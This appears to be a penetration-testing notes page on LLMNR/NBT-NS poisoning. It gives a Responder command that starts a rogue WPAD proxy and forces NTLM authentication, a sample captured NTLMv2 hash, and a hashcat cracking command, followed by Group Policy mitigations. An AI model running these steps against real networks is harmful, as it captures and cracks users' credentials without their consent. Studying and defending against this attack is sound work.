# LLMNR Poisoning

LLMNR (Local-Link Multicast Name Resolution) is used to identify hosts when DNS fails to do so.

Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to.

The tools for LLMNR poisoning are more useful when used in the **morning** or **after the lunch break**, when there is a lot of user access.

#### Methodology

* Run Responder
* Await for user's NTLM hashes
* Save the captured hash
* Crack it with Hashcat or JtR



## Run Responder

Responder is an LLMNR, NBT-NS and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix (see: [http://support.microsoft.com/kb/163409)](http://support.microsoft.com/kb/163409\)). By default, the tool will only answer to File Server Service request, which is for SMB.

```bash
sudo responder -I eth0 -dwP
# -d: Enable answers for DHCP broadcast requests.
# -w: Start the WPAD rogue proxy server.
# -P: Force NTLM/Basic authentication for the proxy.
```



## Save and Crack NTLMv2 hash

When a user sends us his credentials, save into a file.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

{% code title="hashes.txt" overflow="wrap" %}
```
p.agila::FLUFFY:31239907f0666698:EF20DFF2B8003B150B4E9F7A6A03AF48:010100000000000080D1F57C82D1DB0162E819C16CAB43AD00000000020008004D0035005900350001001E00570049004E002D004B005A0045003200590054004D00420048004500420004003400570049004E002D004B005A0045003200590054004D0042004800450042002E004D003500590035002E004C004F00430041004C00030014004D003500590035002E004C004F00430041004C00050014004D003500590035002E004C004F00430041004C000700080080D1F57C82D1DB01060004000200000008003000300000000000000001000000002000009D852C9A3AE62BB88E02A94E10A5B8B6068E81D20E97F51647897DF6316952240A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100330038000000000000000000
```
{% endcode %}

Then, crack it.

```bash
hashcat -m 5600 hashes.txt /PATH/TO/rockyou.txt
```



## Mitigation

The main mitigation is create a Group Policy, with **LLMNR** and **NBT-NS** disabled.&#x20;

<pre data-title="Policy Path LLMNR" data-overflow="wrap"><code><strong>"Computer Configuration" > "Policies" > "Administrative Template" > "Network" > "DNS Client" > "Turn off multicast name resolution" > "Enabled"
</strong></code></pre>

{% code title="Policy Path NBT-NS" overflow="wrap" %}
```
"Network Connections" > "Network Adapter Propeties" > "TCP/IPv4 Properties" > Advanced tab > WINS tab and select "Disavle NetBIOS over TCP/IP"
```
{% endcode %}

Then push the policy out to the network.

{% hint style="warning" %}
If a company **must use** or **cannot disable** LLMNR/NBT-NS, the best course of action is to:

* Require **Network Access Control**
* Require **strong user passwords** ( **> 14 chars**). The more complex and long the pass, the harder it is for a hacket to crack the hash
{% endhint %}

